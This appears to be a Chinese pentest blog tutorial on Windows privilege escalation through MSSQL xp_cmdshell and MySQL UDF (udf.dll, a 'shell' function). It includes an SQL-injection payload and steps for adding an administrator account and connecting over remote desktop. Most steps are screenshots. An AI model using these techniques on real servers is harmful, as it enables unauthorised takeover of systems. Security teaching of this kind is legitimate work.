---
draft: false
date: 2016-08-07 23:38:58
title: Windows 下第三方服务提权
description: 
categories:
  - Pentest
tags:
  - intranet
---

### 0x00  MSSQL提权
MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权  
提权条件：数据库账号是DBA权限

*  关于xp_cmdshell
    * 得到数据库连接信息，连接数据库后执行```EXEC xp_cmdshell 'net user';```
    * 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如```?id=1;EXEC xp_cmdshell 'net user';--```

* 连接数据库
![Windows下第三方服务提权-找数据库连接信息](/img/post/privilge_escalation_win_find_sql_conn_msg.png)
![Windows下第三方服务提权-连接mssql数据库](/img/post/privilge_escalation_win_conn_mssql.png)

* 执行系统命令
![Windows下第三方服务提权-尝试用xp_cmdshell执行命令](/img/post/privilge_escalation_win_try_exec_sys_command.png)
![Windows下第三方服务提权-开启xp_cmdshell组件](/img/post/privilge_escalation_win_open_cmd_shell.png)
![Windows下第三方服务提权-使用xp_cmdshell成功执行命令](/img/post/privilge_escalation_win_exec_sys_command_success.png)

* 添加用户
![Windows下第三方服务提权-添加用户](/img/post/privilge_escalation_win_add_user.png)
![Windows下第三方服务提权-查看添加的用户](/img/post/privilge_escalation_win_view_user.png)

* 远程连接
![Windows下第三方服务提权-远程连接](/img/post/privilge_escalation_win_remote_conn.png)
![Windows下第三方服务提权-输入用户名和密码](/img/post/privilge_escalation_win_input_u_p.png)
![Windows下第三方服务提权-输入用户名和密码](/img/post/privilge_escalation_win_remote_connection_view_ip.png)

### 0x01 MySQL提权
环境：web应用服务器权限较低  
提权条件：MySQL是system权限

* 关于UDF

MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。

* UDF提权过程
    * 导入udf.dll到服务器指定目录  
        * MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下  
        * MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建
    * 使用SQL语句创建功能函数  
        CREATE FUNCTION shell RETURNS STRING SONAME 'udf.dll';
    * 执行MySQL语句调用新创建的函数  
        select shell('cmd','whoami');
    * 删除创建的函数  
        drop function shell;

* 查看基本信息
![Windows下第三方服务提权-查看基本信息](/img/post/privilge_escalation_win_view_base_msg.png)
![Windows下第三方服务提权-查看当前用户](/img/post/privilge_escalation_win_view_current_user.png)
![Windows下第三方服务提权-查看当前用户权限](/img/post/privilge_escalation_win_view_current_user_permissions.png)

* 上传udf提权
![Windows下第三方服务提权-上传udf](/img/post/privilge_escalation_win_upload_udf.png)
![Windows下第三方服务提权-连接数据库](/img/post/privilge_escalation_win_conn_mysql.png)
![Windows下第三方服务提权-导出udf.dll并生成函数](/img/post/privilge_escalation_win_export_udf.png)
![Windows下第三方服务提权-提权成功执行whoami](/img/post/privilge_escalation_win_exec_whoami.png)

* 添加用户
![Windows下第三方服务提权-通过shell函数添加用户](/img/post/privilge_escalation_win_shell_add_user.png)
![Windows下第三方服务提权-通过shell函数添加用户到管理员组](/img/post/privilge_escalation_win_shell_add_user_to_administrators.png)
![Windows下第三方服务提权-通过shell函数激活用户](/img/post/privilge_escalation_win_shell_active_user.png)
![Windows下第三方服务提权-通过shell函数查看用户](/img/post/privilge_escalation_win_shell_view_user.png)

* 远程连接
![Windows下第三方服务提权-远程3389连接](/img/post/privilge_escalation_win_shell_remote_connection.png)
